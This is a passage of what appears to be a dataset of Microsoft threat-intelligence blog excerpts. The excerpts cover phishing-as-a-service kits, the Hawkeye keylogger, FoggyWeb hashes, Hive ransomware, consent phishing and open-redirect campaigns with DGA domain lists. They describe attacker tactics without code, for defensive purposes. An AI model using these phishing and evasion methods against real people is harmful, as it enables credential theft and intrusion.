facilitated by a large economy of email and false sign-in templates, code, and other assets. While it was once necessary for attackers to individually build phishing emails and brandimpersonating websites, the phishing landscape has evolved its own service-based economy. Attackers who aim to facilitate phishing attacks may purchase resources and infrastructure from other attacker groups including: \nPhish kits: Refers to kits that are sold on a one-time sale basis from phishing kit sellers and resellers. These are packaged files, usually a ZIP file, that come with ready-to-use email phishing templates designed to evade detection and are often accompanied by a portal with which to access them. Phish kits allow customers to set up the websites and purchase the domain names. Alternatives to phishing site templates or kits also include templates for the emails themselves, which customers can customize and configure for delivery. One example of a known phish kit is the MIRCBOOT phish kit. Phishing-as-a-service: Similar to ransomware-as-a-service (RaaS), phishingas-a-service follows the software-as-a-service model, which requires attackers to pay an operator to wholly develop and deploy large portions or complete phishing campaigns from false sign-in page development, website hosting, and credential parsing and redistribution. BulletProofLink is an example of a phishing-as-a-service (PhaaS) operation. \nIt's worth noting that some PhaaS groups may offer the whole deal-from template creation, hosting, and overall orchestration, making it an enticing business model for their clientele. Many phishing service providers offer a hosted scam page solution they call \"FUD\" Links or \"Fully undetected\" links, a marketing term used by these operators to try and provide assurance that the links are viable until users click them. These phishing service providers host the links and pages and attackers who pay for these services simply receive the stolen credentials later on. Unlike in certain ransomware operations, attackers do not gain access to devices directly and instead simply receive untested stolen credentials. ", "source": "microsoft"}, {"title": "defend", "content": "Investigating specific email campaigns allows us to ensure protections against particular attacks as well as similar attacks that use the same techniques, such as the infinite subdomain abuse, brand impersonation, zero-point font obfuscation, and victim-specific URI used in the campaign discussed in this blog. By studying phishing-as-a-service operations, we are able to scale and expand the coverage of these protections to multiple campaigns that use the services of these operations. \nIn the case of BulletProofLink, our intelligence on the unique phishing kits, phishing services, and other components of phishing attacks allows us to ensure protection against the many phishing campaigns this operation enables. Microsoft Defender for Office 365-which uses machine learning, heuristics, and an advanced detonation technology to analyze emails, attachments, URLs, and landing pages in real time-recognizes the BulletProofLink phishing kit that serves the false sign-in pages and detects the associated emails and URLs. \nIn addition, based on our research into BulletProofLink and other PhaaS operations, we observed that numerous phishing kits leverage the code and behaviors of existing kits, such as those sold by BulletProofLink. Any kit that attempts to leverage similar techniques, or stitch together code from multiple kits can similarly be detected and remediated before the user receives the email or engages with the content. \nWith Microsoft 365 Defender, we're able to further expand that protection, for example, by blocking of phishing websites and other malicious URLs and domains in the browser through  Microsoft Defender SmartScreen, as well as the detection of suspicious and malicious behavior on endpoints. Advanced hunting capabilities allow customers to search through key metadata fields on mailflow for the \nCatching the big fish: Analyzing a large-scale phishing-as-a-service operation | Microsoft Security Blog indicators listed in this blog and other anomalies. Email threat data is correlated with signals from endpoints and other domains, providing even richer intelligence and expanding investigation capabilities. \nTo build resilience against phishing attacks in general, organizations can use antiphishing policies to enable mailbox intelligence settings, as well as configure impersonation protection settings for specific messages and sender domains. Enabling SafeLinks ensures real-time protection by scanning at time of delivery and at time of click. \nIn addition to taking full advantage of the tools available in Microsoft Defender for Office 365, administrators can further strengthen defenses against the threat of phishing by securing the Azure AD identity infrastructure. We strongly recommend enabling multifactor authentication and blocking sign-in attempts from legacy authentication. \nLearn how you can stop credential phishing and other email threats through comprehensive, industry-leading protection with Microsoft Defender for Office 365. \nMicrosoft 365 Defender Threat Intelligence Team ", "source": "microsoft"}, {"title": "Introduction", "content": "Our evaluation criteria describe the characteristics and behavior of malware and potentially unwanted applications and guide the proper identification of threats. Learn how we classify malicious software, unwanted software, and potentially unwanted applications. Read the blog post. \nOur updated objective criteria also explains how advertising software can provide users with choice and control. Programs that do not follow these rules will be detected as adware and immediately removed from the user's machine: \nPrograms that promote a product or service outside of their own program can interfere with your computing experience. You should have clear choice and control when installing programs that open advertisements. \nThe advertisements that are opened by these programs must: \nInclude an obvious way to close the ad.   \nInclude the name of the program that created the ad. \nThe program that creates these advertisements must: \nProvide a standard uninstall method for the program using the same name as shown in the ads it produces. \nIt is important that both developers and our customers understand this criteria. I will look at each of the points individually. But first, let's look at which programs can qualify as adware. ", "source": "microsoft"}, {"title": "Introduction", "content": "Despite its name, Hawkeye Keylogger \u2013 Reborn v8 is more than a common keylogger. Over time, its authors have integrated various modules that provide advanced functionalities like stealth and detection evasion, as well as credential theft and more. \nMalware services like Hawkeye are advertised and sold in the deep web, which requires anonymity networks like Tor to access, etc. Interestingly, the Hawkeye authors advertised their malware and even published tutorial videos on a website on the surface web (that has since been taken down). Even more interesting, based on underground forums, it appears the malware authors have employed intermediary resellers, an example of how cybercriminal underground business models expand and evolve. \nOur investigation into the April 2018 Hawkeye campaign shows that the cybercriminals have been preparing for the operation since February, when they registered the domains they later used in the campaign. \nTypical of malware campaigns, the cybercriminals undertook the following steps: \nBuilt malware samples and malware configuration files using a malware builder they acquired from the underground   \nBuilt weaponized documents to be used a social engineering lure (possibly by using another tool bought in the underground)   \nPacked or obfuscated the samples (using a customized open-source packer)   \nRegistered domains for delivery of malware   \nLaunched a spam campaign (possibly using a paid spam service) to distribute the malware \nLike other malware toolkits, Hawkeye comes with an admin panel that cybercriminals use to monitor and control the attack. \nInterestingly, some of the methods used in this Hawkeye campaign are consistent with previous attacks. This suggests that the cybercriminals behind this campaign may be the same group responsible for malware operations that delivered the remote access tool (RAT) Remcos and the info-stealing bot malware Loki. The following methods were used in these campaigns: \nMultiple documents that create a complicated, multi-stage delivery chain   \nRedirections using shortened bit.ly links   \nUse of malicious macro, VBScript, and PowerShell scripts to run the malware; the Remcos campaign employed an exploit for CVE-2017-0199 but used the same domains   \nConsistent obfuscation technique across multiple samples ", "source": "microsoft"}, {"title": "defend", "content": "Hawkeye illustrates the continuous evolution of malware in a threat landscape fueled by the cybercriminal underground. Malware services make malware accessible to even unsophisticated operators, while simultaneously making malware more durable with advanced techniques like in-memory unpacking and abuse of .NET's CLR engine for stealth. In this blog we covered the capabilities of its latest version, Hawkeye Keylogger \u2013 Reborn v8, highlighting some of the enhancements from the previous version. Given its history, Hawkeye is likely to release a new version in the future. \nOrganizations should continue educating their employees about spotting and preventing social engineering attacks. After all, Hawkeye's complicated infection chain begins with a social engineering email and lure document. A security-aware workforce will go a long way in securing networks against attacks. \nMore importantly, securing mailboxes, endpoints, and networks using advanced threat protection technologies can prevent attacks like Hawkeye, other malware operations, and sophisticated cyberattacks. \nOur in-depth analysis of the latest version and our insight into the cybercriminal operation that drives this development allow us to proactively build robust protections against both known and unknown threats. \nOffice 365 Advanced Threat Protection (Office 365 ATP) protects mailboxes as well as files, online storage, and applications from malware campaigns like Hawkeye. It uses a robust detonation platform, heuristics, and machine learning to inspect attachments and links for malicious content in real-time, ensuring that emails that carry Hawkeye and other threats don't reach mailboxes and devices. Learn how to add Office 365 ATP to existing Exchange or Office 365 plans. \nWindows Defender Antivirus (Windows Defender AV) provides an additional layer of protection by detecting malware delivered through email, as well as other infection vectors. Using local and cloud-based machine learning, Windows Defender AV's next-gen protection can block even new and unknown threats on Windows 10 and Windows 10 in S mode. \nAdditionally, endpoint detection and response (EDR) capabilities in Windows Defender Advanced Threat Protection (Windows Defender ATP) expose sophisticated and evasive malicious behavior, such as those used by Hawkeye. Sign up for free Windows Defender ATP trial. \nWindows Defender ATP's rich detection libraries are powered by machine learning and allows security operations teams to detect and respond to anomalous attacks in the network. For example, machine learning detection algorithms surface the following alert when Hawkeye uses a malicious PowerShell to download the payload: \nFigure 16: Windows Defender ATP alert for Hawkeye's malicious PowerShell component \nWindows Defender ATP also has behavior-based machine learning algorithms that detect the payload itself: \nFigure 17: Windows Defender ATP alert for Hawkeye's payload \nThese security technologies are part of the advanced threat protection solutions in Microsoft 365. Enhanced signal sharing across services in Windows, Office 365, and Enterprise Mobility $^+$ Security through the Microsoft Intelligent Security Graph enables the automatic update of protections and orchestration of remediation across Microsoft 365. ", "source": "microsoft"}, {"title": "Introduction", "content": "In this blog post, we will go over Storm-0501's tactics, techniques, and procedures (TTPs), typical attack methods, and expansion to the cloud. We will also provide information on how Microsoft detects activities related to this kind of attack, as well as provide mitigation guidance to help defenders protect their environment. ", "source": "microsoft"}, {"title": "Defense", "content": "The threat actor attempted to evade detection by tampering with security products in some of the devices they got hands-on-keyboard access to. They employed an open-source tool, resorted to PowerShell cmdlets and existing binaries to evade detection, and in some cases, distributed Group Policy Object (GPO) policies to tamper with security products. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nCybercrime \nDuring the month of January 2022, the Microsoft Threat Intelligence Center (MSTIC) ran its inaugural hackathon for the open-source Jupyter and Python Security Tools library, MSTICPy. We asked the security community for their contributions to expand and improve MSTICPy's features and capabilities, and we helped contributors shape and deliver their contributions. As MSTICPy is an open-source project, contributions from the community are highly valued and help to make the tools useful and effective. \nThe response from the community was fantastic, with engagement and discussions on the future design and direction of MSTICPy, and many awesome contributions that ranged from updated documentation to completely new features. We are incredibly grateful for everyone's engagement and wanted to take a moment to highlight some of the contributions and extend our sincere thanks to the authors. \nSome of these contributions are already released in MSTICPy 1.6.1, while most of the remaining items will make it into version 1.7.0, to be released in late February 2022. ", "source": "microsoft"}, {"title": "Conclusion", "content": "There are several other contributions still being worked on that we will incorporate as soon as they are ready. We will include these in a future release of MSTICPy. You can keep up to date with MSTICPy on GitHub and by following $@$ msticpy on Twitter. \nWe plan to run more hackathons in the year, but contributions, ideas, and feedback are welcome at any time. ", "source": "microsoft"}, {"title": "Introduction", "content": "Macros are popular among attackers because of the rich capabilities that the VBA runtime exposes and the privileged context in which macros execute. Notably, as with all scripting languages, attackers have another advantage: they can hide malicious code through obfuscation. \nTo evade detection, malware needs to hide intent. The most common way that attackers do this is through code obfuscation. Macro source codes are easy to obfuscate, and a plethora of free tools are available for attackers to automatically do this. This results in polymorphic malware, with evolving obfuscation patterns and multiple obfuscated variants of the same malicious macro. \nThere's more: malicious code can be taken out of the macro source and hidden in other document components like text labels, forms, Excel cells, and others. Or why hide at all? A small piece of malicious code can be embedded somewhere in a huge legitimate source and keep a low profile. \nHow can antivirus and other security solutions cope? Today, antivirus solutions can extract and scan the obfuscated macro source code from an Office document. How can the macro's intent be exposed? What if security solutions can observe a macro's behavior at runtime and gain visibility into system interactions? Enter Office and AMSI integration. ", "source": "microsoft"}, {"title": "Protection", "content": "In addition to protecting users running Office 365 applications on Windows 10, detections via AMSI allow modern endpoint protection platforms like Windows Defender ATP to extend protection to customers via the cloud. \nIn Windows Defender AV's cloud-delivered antivirus protection, the Office VBA and AMSI integration enriches the signals sent to the cloud, where multiple layers of machine learning models classify and make verdicts on files. When devices encounter documents with suspicious macro code, Windows Defender AV sends metadata and other machine learning features, coupled with signals from Office AMSI, to the cloud. Verdicts by machine learning translate to real-time protection for the rest of Windows Defender AV customers with cloud protection enabled. \nThis protection is also delivered to the rest of Microsoft 365 customers. Through the Microsoft Intelligent Security Graph, security signals are shared across components of Microsoft 365 threat protection. For example, in the case of macro malware, detections of malicious macro-laced documents by Windows Defender AV are shared with Office 365 ATP, which blocks emails carrying the document, stopping attacks before the documents land in users mailboxes. \nWithin a few weeks after the release of this new instrumentation in Office VBA and the adoption by Windows Defender ATP, we saw this multiplier effect, with signals from a few hundred devices protecting several tens of thousands of devices. Because Office AMSI feature exposes behaviors of the macro irrespective of content, language, or obfuscation, signals from one part of the world can translate to protection for the rest of the globe \u2013 this is powerful. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Defender Security Research Team \nMicrosoft Defender for Endpoint Attacker techniques, tools, and infrastructure \nDofoil is a sophisticated threat that attempted to install coin miner malware on hundreds of thousands of computers in March, 2018. In previous blog posts we detailed how behavior monitoring and machine learning in Windows Defender AV protected customers from a massive Dofoil outbreak that we traced back to a software update poisoning campaign several weeks prior. Notably, customers of Windows 10 S, a special Windows 10 configuration that provides streamlined Microsoft-verified security, were not affected by the Dofoil outbreak. \nIn this blog post, we will expound on Dofoil's anti-debugging and anti-analysis tactics, and demonstrate how the rich detection libraries of Windows Defender Advanced Threat Protection and Windows Defender Exploit Guard can help during investigation. \nWe found that Dofoil was designed to be elusive to analysis. It checks its environment and stops running in virtual machine environments. It also checks for various analysis tools and kills them right away. This can make malware analysis and assessment challenging. \nThe following diagram shows the multi-stage malware execution process, which includes checks for traits of analysis environments during some stages. \nThe table below describes the purpose of each stage. The first five stages have at least one or two different techniques that can deter dynamic or static malware analysis. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Dofoil is a very evasive malware. It has various system environment checks and tests Internet connectivity to make sure it runs on real machines, not in analysis environments or virtual machines. This can make the analysis time-consuming and can mislead malware analysis systems. \nIn attacks like the Dofoil outbreak, Windows Defender Advanced Threat Protection (Windows Defender ATP) can help network defenders analyze the timeline from the victim machine and get rich information on process execution flow, C&C connections, and process hollowing activities. With the new advanced hunting capabilities in preview, you can run powerful custom queries and pivot freely to different sets of possible targets, malicious entities, and suspicious activity. Windows Defender ATP can also be used as an analysis platform with fine-tuned visibility into system activities when set up in a lab environment. This can save time and resource during malware investigation. \nIn addition, Windows Defender Exploit Guard can be useful in finding malicious shellcodes that traverse export address tables. Windows Defender Exploit Guard can be an excellent tool for finding and blocking malware and exploit activities. \nWindows Defender Exploit Guard events are surfaced in the Windows Defender ATP portal, which integrates protections from other Microsoft solutions, including Windows Defender AV and Windows Defender Application Guard. This integrated security management experience makes Windows Defender ATP a comprehensive solution for detecting and responding to a wide range of malicious activities across the network. \nWindows 10 S, a special configuration of Windows 10, locks down devices against Dofoil and other attacks by working exclusively with apps from the Microsoft Store and using Microsoft Edge as the default browser. This streamlined, Microsoftverified platform seals common malware entry points. \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. \nMatt Oh, Stefan Sellmer, Jonathan Bar Or, Mark Wodrich Windows Defender ATP Research ", "source": "microsoft"}, {"title": "Introduction", "content": "By Ramin Nafisi, Microsoft Threat Intelligence Center Microsoft Threat Intelligence \nMicrosoft continues to work with partners and customers to track and expand our knowledge of the threat actor we refer to as NOBELIUM, the actor behind the SUNBURST backdoor, TEARDROP malware, and related components. As we stated before, we suspect that NOBELIUM can draw from significant operational resources often showcased in their campaigns, including custom-built malware and tools. In March 2021, we profiled NOBELIUM's GoldMax, GoldFinder, and Sibot malware, which it uses for layered persistence. We then followed that up with another post in May, when we analyzed the actor's early-stage toolset comprising EnvyScout, BoomBox, NativeZone, and VaporRage. \nThis blog is another in-depth analysis of newly detected NOBELIUM malware: a post-exploitation backdoor that Microsoft Threat Intelligence Center (MSTIC) refers to as FoggyWeb. As mentioned in previous blogs, NOBELIUM employs multiple \nhttps://www.microsoft.com/en-us/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/ tactics to pursue credential theft with the objective of gaining admin-level access to Active Directory Federation Services (AD FS) servers. Once NOBELIUM obtains credentials and successfully compromises a server, the actor relies on that access to maintain persistence and deepen its infiltration using sophisticated malware and tools. NOBELIUM uses FoggyWeb to remotely exfiltrate the configuration database of compromised AD FS servers, decrypted token-signing certificate, and tokendecryption certificate, as well as to download and execute additional components. Use of FoggyWeb has been observed in the wild as early as April 2021. \nMicrosoft has notified all customers observed being targeted or compromised by this activity. If you believe your organization has been compromised, we recommend that you \nAudit your on-premises and cloud infrastructure, including configuration, peruser and per-app settings, forwarding rules, and other changes the actor might have made to maintain their access Remove user and app access, review configurations for each, and re-issue new, strong credentials following documented industry best practices. Use a hardware security module (HSM) as described in securing AD FS servers to prevent the exfiltration of secrets by FoggyWeb. \nMicrosoft security products have implemented detections and protections against this malware. Indicators of compromise $\\underline{{\\mathrm{IO}}}(\\underline{{\\mathsf{s}}})$ , mitigation guidance, detection details, and hunting queries for Azure Sentinel and Microsoft 365 Defender customers are provided at the end of this analysis and in the product portals. Active Directory Federation Services (AD FS) servers run on-premises and customers can also follow detailed guidance on securing AD FS servers against attacks. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "Threat Threat   \nType Name Type Indicator   \nMD5 FoggyWeb Loader 5d5a1b4fafaf0451151d552d8eeb73ec   \nSHA-1 FoggyWeb Loader c896ece073dd01191cbc1d462bc2f47161828a83   \nSHA- 231b5517b583de102cde59630c3bf938155d17037162 FoggyWeb Loader   \n256 f663874e4662af2481b1 Backdoor   \nMD5 FoggyWeb (encrypte 9ff9401315d0f7258a9fcde0cfdef02b d) Backdoor   \nSHA-1 FoggyWeb (encrypte 4597431f26424cb814c917168fa8d74d01ab7cd1 d) Backdoor   \nSHA- da0be762bb785085d36aec80ef1697e25fb154145147 FoggyWeb (encrypte   \n256 68b3bcaf798dd9c9b169 d) Backdoor   \nMD5 FoggyWeb (decrypte e9671d294ce41fe6dbb9637dc0157a88 d) Backdoor   \nSHA-1 FoggyWeb (decrypte 85cfeccbb48fd9f498d24711c66e458e0a80cc90 d) Backdoor   \nSHA- 568392bd815de9b677788addfc4fa4b0a5847464b920 FoggyWeb (decrypte   \n256 8d2093a8623bbecd81e6 d) ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nApril 2023 update \u2013 Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. DEV-0237 is now tracked as Pistachio Tempest. \nTo learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. \nHive ransomware is only about one year old, having been first observed in June 2021, but it has grown into one of the most prevalent ransomware payloads in the ransomware as a service (RaaS) ecosystem. With its latest variant carrying several major upgrades, Hive also proves it's one of the fastest evolving ransomware families, exemplifying the continuously changing ransomware ecosystem. \nThe upgrades in the latest variant are effectively an overhaul: the most notable changes include a full code migration to another programming language and the use of a more complex encryption method. The impact of these updates is farreaching, considering that Hive is a RaaS payload that Microsoft has observed in attacks against organizations in the healthcare and software industries by large ransomware affiliates like DEV-0237. \nMicrosoft Threat Intelligence Center (MSTIC) discovered the new variant while analyzing detected Hive ransomware techniques for dropping .key files. We know that Hive drops its encryption keys file, which contains encrypted keys used to decrypt encrypted files, and uses a consistent naming pattern: \n[KEY_NAME].key.[VICTIM_IDENTIFIER](e.g., BiKtPupMjgyESaene0Ge5d0231uiKq1PFMFUEBNhAYv_.key.ab123)\nThe said .key files were missing the [VICTIM_IDENTIFIER] part of the file name, prompting deeper analysis of the Hive ransomware that dropped them. This analysis led to the discovery of the new Hive variant and its multiple versions, which exhibit slightly different available parameters in the command line and the executed processes. \nAnalyzing these patterns in samples of the new variants, we discovered even more samples, all with a low detection rate and none being correctly identified as Hive. In this blog we will share our in-depth analysis of the new Hive variant, including its main features and upgrades, with the aim of equipping analysts and defenders with information to better identify and protect organizations against malware attacks relying on Hive. ", "source": "microsoft"}, {"title": "Introduction", "content": "In 2022, Microsoft mitigated an average of 1,435 attacks per day. The maximum number of attacks in a day recorded was 2,215 attacks on September 22, 2022. The minimum number of attacks in a day was 680 on August 22, 2022. In total, we mitigated upwards of 520,000 unique attacks against our global infrastructure during 2022. \nThis year, we saw a lower volume of attacks in June through August and a high volume of attacks during the holiday season until the last week of December. This is in line with attacks trends we have seen in the last few years, except for 2021 where there were fewer attacks during the holiday season. In May, we mitigated a 3.25 terabits per second (TBps) attack in Azure, the largest attack in 2022. \nDDoS protection tip: Make sure to avoid having a single virtual machine backend so it is less likely to get overwhelmed. Azure DDoS Protection covers scaled out costs incurred for all resources during an attack, so configure autoscaling to absorb the initial burst of attack traffic while mitigation kicks in. ", "source": "microsoft"}, {"title": "Protection", "content": "Azure provides comprehensive solutions to protect your valuable data and resources from the most sophisticated DDoS attacks at any scale. Azure DDoS Protection provides always-on traffic monitoring to automatically mitigate an attack when detected, adaptive real time tuning that compares your actual traffic against predefined thresholds, and full visibility on DDoS attacks with real-time telemetry, monitoring, and alerts. Customers using Azure DDoS Protection have access to the DDoS Rapid Response support (DRR) team to engage experts for help during an active attack. Protection is simple to enable and designed to meet the needs of all organizations, including a cost-effective SKU for small and medium businesses (SMBs). \nFor more insights on the latest threat intelligence, visit Security Insider. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft 365 Defender \nMicrosoft Defender Antivirus Microsoft Defender for Endpoint Microsoft Defender for Cloud Apps Microsoft Defender for Office 365 Microsoft 365 Defender advanced hunting \nMicrosoft Defender for Cloud Microsoft Defender for IoT Microsoft Sentinel Microsoft Sentinel queries   \no Azure Firewall Premium   \n0 Azure Web Application Firewall (WAF) \n4. Indicators of compromise (IoCs) ", "source": "microsoft"}, {"title": "Introduction", "content": "Onyx Sleet conducts cyber espionage primarily targeting military, defense, and technology industries, predominately in India, South Korea, and the United States. This threat actor has historically leveraged spear-phishing as a means of compromising target environments; however, in recent campaigns, they have mostly exploited N-day vulnerabilities, leveraging publicly available and custom exploits to gain initial access. In October 2023, Onyx Sleet exploited the TeamCity CVE-2023-42793 vulnerability as a part of a targeted attack. Exploiting this vulnerability enabled the threat actor to perform a remote code execution attack and gain administrative control of the server. \nOnyx Sleet develops and uses a spectrum of tools that range from custom to open source. They have built an extensive set of custom remote access trojans (RATs) that they use in campaigns, and routinely developed new variants of these RATs to add new functionality and implement new ways of evading detection. Onyx Sleet often uses leased virtual private servers (VPS) and compromised cloud infrastructure for command-and-control (C2). \nOnyx Sleet is tracked by other security companies as APT45, SILENT CHOLLIMA, Andariel, DarkSeoul, Stonefly, and TDrop2. ", "source": "microsoft"}, {"title": "Introduction", "content": "Consent phishing attacks abuse legitimate cloud service providers, including Microsoft, Google, and Facebook, that use OAuth 2.0 authorization-a widely used industry protocol that allows third-party apps to access a user's account and perform actions on their behalf. \nThe goal of these attacks is to trick unsuspecting users into granting permissions (consent) to malicious attacker-owned applications. This is different from a typical credential harvesting attack, where an attacker looking to steal credentials would craft a convincing email, host a fake landing page, and expect users to fall for the lure. If the attempt is successful, user credentials are then passed on to the attacker. \nIn a consent phishing attack, the user sign-in takes place at a legitimate identity provider, rather than a fake sign-in page, in an attempt to trick users into granting permissions to malicious attacker-controlled applications. Attackers use the obtained access tokens to retrieve users' account data from the API resource, without any further action by the user. Targeted users who grant the permissions allow attackers to make API calls on their behalf through the attacker-controlled app. Depending on the permissions granted, the access token can also be used to access other data, such as files, contacts, and other profile details. \nMicrosoft Defender for Office 365 data shows an increasing use of this technique in recent months. \nIn most cases, consent phishing attacks do not involve password theft, as access tokens don't require knowledge of the user's password, yet attackers are still able to steal confidential data and other sensitive information. Attackers can then maintain persistence in the target organization and perform reconnaissance to further compromise the network. \nA typical consent phishing attack follows this attack chain: \nAttackers typically configure apps so that they appear trustworthy, registering them using names like \"Enable4Calc\", \"SettingsEnabler\", or \"Settings4Enabler,\" which resemble legitimate business productivity app integrations. Attackers then distribute OAuth 2.0 URLs via conventional email-based phishing attacks, among other possible techniques. \nClicking the URL triggers an authentic consent prompt, asking users to grant the malicious app permissions. Other cloud providers, such as Google, Facebook, or Twitter, display consent prompts or dialog boxes that request for users' permissions on behalf of third-party apps. The permissions requested vary depending on the app. \nuser@contoso.com ", "source": "microsoft"}, {"title": "Defense", "content": "The sophisticated and dynamic threat landscape exemplified by consent phishing attacks demonstrates the importance of employing a Zero Trust security model with a multi-layer defense architecture. \nMicrosoft 365 Defender provides comprehensive protection against consent phishing by coordinating defense across domains using multiple solutions: Microsoft Defender for Office 365, Microsoft Defender for Cloud Apps, and Azure ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender for Office 365 uses advanced filtering technologies backed by machine learning, IP and URL reputation systems, and unparalleled breadth of signals to provide durable protection against phishing and other malicious emails, helping to block consent phishing campaigns out of the gate. Anti-phishing policies in Defender for Office 365 help protect organizations against impersonation-based phishing attacks. \nMicrosoft researchers are constantly tracking OAuth 2.0 URL techniques and use this knowledge to provide feedback to email filtering systems. This helps ensure that Microsoft Defender for Office 365 is providing protection against the latest OAuth phishing attacks and other threats. Signals from Microsoft Defender Office 365 helps identify malicious apps and prevent users from accessing them, and provides rich threat data that organizations can query and investigate using advanced hunting capabilities. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender for Cloud Apps policies such as activity policies, anomaly detection, and OAuth app policies help organizations manage apps connected to their environment. The new app governance add-on feature to Microsoft Defender for Cloud Apps helps organizations: \nDefine appropriate Microsoft 365 app behavior with data, users, and other apps   \nQuickly detect unusual app behavior activity that varies from the baseline, and   \nDisable an app when it behaves differently than expected \nTo give organizations and users confidence in using apps in the Microsoft 365 ecosystem, the Microsoft 365 App Compliance Program enables app developers to establish authenticity of their applications. The program includes publisher verification, publisher attestation, and Microsoft 365 certification. ", "source": "microsoft"}, {"title": "Introduction", "content": "Credential phishing emails represent an extremely prevalent way for threat actors to gain a foothold in a network. The use of open redirects from legitimate domains is far from new, and actors continue to abuse its ability to overcome common precautions. \nPhishing continues to grow as a dominant attack vector with the goal of harvesting user credentials. From our 2020 Digital Defense Report, we blocked over 13 billion malicious and suspicious mails in the previous year, with more than 1 billion of those emails classified as URL-based phishing threats. \nIn this campaign, we noticed that the emails seemed to follow a general pattern that displayed all the email content in a box with a large button that led to credential harvesting pages when clicked. The subject lines for the emails varied depending on the tool they impersonated. In general, we saw that the subject lines contained the recipient's domain and a timestamp as shown in the examples below: \n[Recipient username] 1 New Notification Report Status for [Recipient Domain Name] at [Date and Time] Zoom Meeting for [Recipient Domain Name] at [Date and Time] \nStatus for [Recipient Domain Name] at [Date and Time] Password Notification for [Recipient Domain Name] at [Date and Time] [Recipient username] eNotification \nOnce recipients hover their cursor over the link or button in the email, they are shown the full URL. However, since the actors set up open redirect links using a legitimate service, users see a legitimate domain name that is likely associated with a company they know and trust. We believe that attackers abuse this open and reputable platform to attempt evading detection while redirecting potential victims to phishing sites. \nThe final domains used in the campaigns observed during this period mostly follow a specific domain-generation algorithm (DGA) pattern and use .xyz, .club, .shop, and .online TLDs. The \"Re-view invitation\" button in Figure 3 points to a URL with a trusted domain followed by parameters, with the actor-controlled domain (chi[.]xyz) hidden in plain sight. \nIn August, we detected a fresh spam run from this campaign that used a slightly updated Microsoft-spoofing lure and redirect URL but leveraged the same infrastructure and redirection chain. \nThese crafted URLs are made possible by open redirection services currently in use by legitimate organizations. Such redirection services typically allow organizations to send out campaign emails with links that redirect to secondary domains from their own domains. For example, a hotel might use open redirects to take email recipients to a third-party booking website, while still using their primary domain in links embedded in their campaign emails. \nAttackers abuse this functionality by redirecting to their own malicious infrastructure, while still maintaining the legitimate domain in the full URL. The organizations whose open redirects are being abused are possibly unaware that this is even occurring. ", "source": "microsoft"}, {"title": "defend", "content": "The abuse of open redirectors represents an ongoing threat that Microsoft experts constantly monitor, along with other threat trends and attacker techniques used in attacks today. Microsoft's breadth of visibility into threats combined with our deep understanding of how attackers operate will continue to inform the advanced protection delivered by Microsoft Defender for Office 365  against email-based attacks. \nFor mitigations against the abuse of open redirector links via known third-party platforms or services, users are advised to follow the recommended best practices of their service providers, such as updating to the latest software version, if applicable, to prevent their domains from being abused in future phishing attempts. \nMicrosoft Defender for Office 365 protects customers from this threat by leverages its deep visibility into email threats and advanced detection technologies powered by AI and machine learning. We strongly recommend that organizations configure recommended settings in Microsoft Defender for Office 365, such as applying antiphishing, Safe Links, and Safe Attachments policies. We also recommend installing the Report Message add-in for Outlook to enable users to report suspicious messages to their security teams and optionally to Microsoft. \nAttack simulation lets organizations run realistic, yet safe, simulated phishing and password attack campaigns in your organization. These simulated attacks can help identify and find vulnerable users before a real attack makes a real impact. \nInvestigation capabilities in Microsoft Defender 365 allows organizations to respond phishing and other email-based attacks. Microsoft 365 Defender correlates signals from emails and other domains to deliver coordinated defense.  Microsoft Defender for Endpoint blocks malicious files and other malware as well as malicious behavior that result from initial access via email. Microsoft Defender SmartScreen integrates with Microsoft Edge to block malicious websites, including phishing sites, scam sites, and other malicious sites, while Network protection blocks connections to  malicious domains and IP addresses. \nLearn how you can stop credential phishing and other email threats through comprehensive, industry-leading protection with Microsoft Defender for Office 365. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "Following is a list of domains that match the DGA pattern used in sender addresses in this and other malicious campaigns. Note that these have not all been observed in mail flow related to this campaign. \nDomain Domain D masihtidur-shoes08[.]com masihtidur-shoes07[.]com masihtidur-shoes02[.]com masihtidur-shoes01[.]com wixclwardwual-updates8[.]com wixclwardwual-updates7[.]com wixclwardwual-updates5[.]com wixclwardwual-updates10[.]com zxcsaxb-good8[.]com zxcsaxb-good6[.]com zxcsaxb-good4[.]com zxcsaxb-good3[.]com z trashxn-euyr9[.]com trashxn-euyr7[.]com t trashxn-euyr5[.]com trashxn-euyr3[.]com trashxn-euyr2[.]com trashxn-euyr19[.]com trashxn-euyr17[.]com trashxn-euyr16[.]com trashxn-euyr14[.]com trashxn-euyr12[.]com \nDomain Domain trashxn-euyr10[.]com trashxn-euyr1[.]com berangberang-7[.]com berangberang-12[.]com notoficationdeliveryamazon8[.]com berangberang-8[.]com b berangberang-4[.]com berangberang-10[.]com berangberang-13[.]com berangberang-5[.]com posher876ffffff-30[.]com posher876ffffff-5[.]com fenranutc0x24ai-11[.]com organix-xtc21[.]com fenranutc0x24ai-4[.]com fenranutc0x24ai-17[.]com adminsecurity102[.]com adminsecurity101[.]com \n23moesian-10[.]com 23moesian-11[.]com \n23moesian-19[.]com 23moesian-2[.]com cokils2ptys-1[.]com 23moesian-20[.]com \n23moesian-18[.]com 23moesian-16[.]com sux71a37-net1[.]com sux71a37-net25[.]com sux71a37-net18[.]com sux71a37-net15[.]com sux71a37-net13[.]com sux71a37-net20[.]com sux71a37-net27[.]com sux71a37-net2[.]com bimspelitskalix-xuer9[.]com account-info005[.]com bas9oiw88remnisn-12[.]com bas9oiw88remnisn-27[.]com bas9oiw88remnisn-11[.]com bas9oiw88remnisn-10[.]com b \nDomain Domain bas9oiw88remnisn-13[.]com bas9oiw88remnisn-1[.]com bas9oiw88remnisn-3[.]com bas9oiw88remnisn-20[.]com bas9oiw88remnisn-23[.]com bas9oiw88remnisn-24[.]com 